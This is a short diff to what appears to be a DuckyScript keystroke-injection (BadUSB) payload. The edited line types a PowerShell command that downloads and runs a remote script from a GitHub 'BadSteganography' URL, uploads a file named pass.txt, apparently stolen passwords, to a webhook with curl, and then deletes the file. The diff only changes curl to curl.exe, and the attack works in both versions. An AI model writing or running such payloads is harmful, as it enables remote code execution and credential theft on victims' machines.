@@ -6,5 +6,5 @@ DELAY 1000
 STRING $webhook = 'WEBHOOK'
 ENTER
 DELAY 500
-STRING iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content | iex ; curl -F "file1=@pass.txt" $webhook ; rm pass.txt ; exit
+STRING iex(iwr https://raw.githubusercontent.com/CharlesTheGreat77/BadSteganography/main/spread_spectrum_decode.txt).Content | iex ; curl.exe -F "file1=@pass.txt" $webhook ; rm pass.txt ; exit
 ENTER
